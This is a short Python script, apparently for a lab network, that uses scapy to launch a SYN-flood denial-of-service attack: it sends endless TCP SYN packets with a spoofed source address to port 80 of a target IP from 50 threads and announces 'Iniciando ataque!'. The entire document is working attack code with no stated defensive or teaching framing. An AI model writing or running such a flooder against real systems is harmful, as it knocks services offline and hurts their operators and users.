from scapy.all import *

target_ip = "172.20.1.2"
spoofed_ip = "172.20.1.3"

def attack():
  while True:
        ip = IP(src=spoofed_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=80, flags="S")
        send(ip/tcp, verbose=0)

print("Iniciando ataque!")
for _ in range(50):
    threading.Thread(target=attack).start()
